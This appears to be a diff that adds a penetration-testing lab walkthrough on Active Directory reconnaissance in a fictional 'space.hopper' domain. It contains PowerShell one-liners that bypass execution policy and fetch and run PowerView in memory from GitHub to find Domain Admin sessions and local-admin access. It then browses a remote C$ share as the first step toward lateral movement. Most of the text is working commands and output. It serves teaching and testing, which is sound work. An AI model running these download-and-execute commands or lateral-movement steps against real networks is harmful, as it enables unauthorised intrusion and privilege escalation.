@@ -1,0 +1,95 @@
+Hunt out any machines were an account belonging to the domain administrative group is presently logged on to, and at the same time see if you have local admin rights on any of the identified machines.
+
+PS C:\Users\Gimmyt> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-UserHunter -CheckAccess"
+
+The results can be seen in the below response which details that users belonging to the DA group are presently authenticated on the following two machines IP address 192.168.10.69 and 192.168.10.47, and it lists the machines IP address that the sessions originated from, possibly indicating RDP session or some form of remote access. So, if you can get admin access to any of those four IP addresses and you can reveal the user’s passwords you just got an account belonging to the DA group. Furthermore, the result also reveals if your account has local admin access on the revealed IP address that the DA was identified on, if it said True you would be able to laterally move to the machines.
+
+UserDomain   : space.hopper
+UserName     : Administrator
+ComputerName : cat.space.hopper
+IP           : 192.168.10.69
+SessionFrom  : 192.168.10.48
+LocalAdmin   : False
+
+UserDomain   : space.hopper
+UserName     : HoppyM
+ComputerName : dog.space.hopper
+IP           : 192.168.10.47
+SessionFrom  : 192.168.10.37
+LocalAdmin   : False
+
+-----------------------------------------------------
+
+One liner to see if your account has any administrative rights on any machines in the domain. You sometimes need to run these one or two times in the lab.
+
+PS C:\Users\Gimmyt> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Find-LocalAdminAccess"
+
+mouse.space.hopper
+
+PS C:\Users\Gimmyt>
+
+The response shows a single pc named mouse.space.hopper, be carful as if you only get one response as is the case with user Gimmyt, it’s very easy to miss the response. If you have local admin rights on the machine, you can access the c$ and use tools like PSEXEC on the machine.
+
+-----------------------------------------------------
+
+To verify that admin access to mouse.space.hopper was possible,  I opened another PowerShell session and tried to browse to the C$ on the computer named mouse, the below responses, verify that I was able to do, access to the C$ verifies admin access. To verify this, I also tried to access the machine tilted Snake and got an Access is denied response as you would expect as Gimmyt does not have admin rights on that machine.
+
+
+PS C:\Users\Gimmyt> pushd \\192.168.10.62\c$
+
+PS Microsoft.PowerShell.Core\FileSystem::\\192.168.10.62\c$> dir
+
+
+    Directory: \\192.168.10.62\c$
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----        04/04/1879     18:58            Admin-Share
+d-r--        12/03/1879     00:05            Program Files
+d-r--        10/03/1879     09:30            Program Files (x86)
+d-r--        27/03/1879     12:25            Users
+d----        10/03/1879     02:31            Windows
+
+
+
+PS Microsoft.PowerShell.Core\FileSystem::\\192.168.10.62\c$> cd .\Users
+
+PS Microsoft.PowerShell.Core\FileSystem::\\192.168.10.62\c$\Users> dir
+
+
+    Directory: \\192.168.10.62\c$\Users
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----        10/03/1879     02:35            Administrator
+d-r--        12/04/1879     07:45            Public
+d----        10/03/1879     02:23            Tlob
+d----        27/03/1879     12:25            Gimmyt
+
+
+PS Microsoft.PowerShell.Core\FileSystem::\\192.168.10.62\c$\Users> cd .\Administrator
+
+PS Microsoft.PowerShell.Core\FileSystem::\\192.168.10.62\c$\Users\Administrator> dir
+
+
+    Directory: \\192.168.10.62\c$\Users\Administrator
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d-r--        10/03/1879     02:35            Contacts
+d-r--        10/03/1879     15:52            Desktop
+d-r--        10/03/1879     02:35            Documents
+d-r--        10/03/1879     09:35            Downloads
+d-r--        10/03/1879     02:35            Favorites
+d-r--        10/03/1879     02:35            Links
+d-r--        10/03/1879     02:35            Music
+d-r--        10/03/1879     02:35            Pictures
+d-r--        10/03/1879     02:35            Saved Games
+d-r--        10/03/1879     02:35            Searches
+d-r--        10/03/1879     02:35            Videos
+
+
+-----------------------------------------------------
